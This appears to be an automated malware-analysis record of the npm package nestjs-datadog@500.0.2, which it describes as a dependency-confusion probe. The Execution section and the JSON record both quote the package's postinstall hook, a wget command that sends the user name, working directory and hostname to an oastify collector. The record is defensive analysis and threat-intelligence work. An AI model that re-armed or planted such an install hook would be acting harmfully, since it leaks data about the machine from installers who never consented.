# npm nestjs-datadog@500.0.2

**Source:** datadog · **Source label:** malicious · **Released:** 2025-08-11 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package ships only package.json and a README; its whole install-time behaviour is one `postinstall` shell command. That command runs `wget --quiet` against an oastify interaction host, putting the output of `whoami`, `pwd` and `hostname` into the query string. There are no gates: the beacon fires on every install where a POSIX shell, wget and outbound HTTP to the collector are available. The version number (500.0.2) and the callback style point to a dependency-confusion probe.

## Execution

- **postinstall** `wget --quiet "hxxp://ydf3iu418cjdq07aa10sahdzoquhi8lwa[.]oastify[.]com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`: no package files; inline_shell.

## Gates

None.

## Requirements

- installed_tool: wget (the hook calls wget directly with no fallback)
- os: linux (the $(whoami), $(pwd), $(hostname) substitutions need a POSIX shell; on Windows npm runs hooks with cmd.exe and they are not expanded (darwin also works))
- network: ydf3iu418cjdq07aa10sahdzoquhi8lwa[.]oastify[.]com:80 (the collected values are sent in an HTTP GET to this host)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The prefilled `download_then_exec` launch style was replaced with `inline_shell`, because the wget response is saved to disk but never run.
- On Windows (cmd.exe) the `$(...)` substitutions are not expanded, so the request carries no host data. That is recorded as an `os` requirement, not a gate.
- The README claims a responsible-disclosure takeover. That is package text only and did not affect any label.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "nestjs-datadog",
    "version": "500.0.2",
    "archive_sha256": "5c1d635ba5c25854c2c6b569b0a452c3ffcc9dbff49c9532fb285914fd3f879c",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-08-11",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-08-11-nestjs-datadog-v500.0.2.zip",
    "package_root": "layer0/tmp/tmpnui0juxz/nestjs-datadog/package",
    "cluster_key": "b52e79a9db5206dc974fa80a39537a0efc299b523f8d72c1c824f94fbb3bd626",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "postinstall",
        "command": "wget --quiet \"hxxp://ydf3iu418cjdq07aa10sahdzoquhi8lwa[.]oastify[.]com/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "The only install code is the postinstall hook string in package.json, read in full. No JS files ship; main names index.js, which is absent. README.md is text only.",
      "launch_style changed from download_then_exec to inline_shell: wget only sends a GET carrying whoami, pwd and hostname output in the query string. The response is saved to a file in the package folder but never run.",
      "No conditions in the hook string: the beacon runs on every install where sh and wget exist. --quiet only hides wget output; a failed request fails the install, so silent_failure stays false.",
      "README.md claims the name was taken over for responsible disclosure and names a researcher handle (redacted). This is package text; it was not used for any label."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": "wget",
      "reason": "the hook calls wget directly with no fallback"
    },
    {
      "axis": "os",
      "value": "linux",
      "reason": "the $(whoami), $(pwd), $(hostname) substitutions need a POSIX shell; on Windows npm runs hooks with cmd.exe and they are not expanded (darwin also works)"
    },
    {
      "axis": "network",
      "value": "ydf3iu418cjdq07aa10sahdzoquhi8lwa[.]oastify[.]com:80",
      "reason": "the collected values are sent in an HTTP GET to this host"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://ydf3iu418cjdq07aa10sahdzoquhi8lwa[.]oastify[.]com/",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify callback dependency-confusion probe",
  "claude_assessment": "malicious",
  "assessment_reason": "The postinstall hook sends the installing user's name, working directory and hostname to an out-of-band interaction (oastify) collector on every install, with no gate. It is a dependency-confusion style beacon with an inflated version number; it does nothing further, but it exfiltrates host identity without consent.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
